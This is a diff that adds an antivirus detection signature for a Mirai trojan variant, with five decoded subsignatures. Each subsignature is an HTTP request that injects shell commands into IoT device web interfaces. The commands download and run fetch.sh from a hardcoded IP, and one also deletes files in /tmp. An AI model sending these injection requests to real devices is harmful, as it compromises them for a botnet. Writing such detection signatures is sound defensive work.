@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-9769811-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1|2|3|4)>3,4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(wget http://185.239.242.197/fet
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /shell?cd /tmp; rm -rf *; wget http://185.239.242.197/fetch.sh; chmod 777 fetch.sh; sh fetch.sh HTTP/1.0
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /login.cgi?cli=aa%20aa%27cd%20/tmp;wget%20http://185.239.242.197/fetch.sh;chmod%20777%20fetch.sh%20sh%20/tmp/%27$fetch.sh HT
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+GET /VhttpdMgr?action=importFile&fileName=wget http://185.239.242.197/fetch.sh; chmod 777 fetch.sh; sh fetch.sh HTTP/1.1
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=8.8.8.8%cd%20/tmp/%0awget%20http://185.239.242.197/fetch.sh%0ash%2
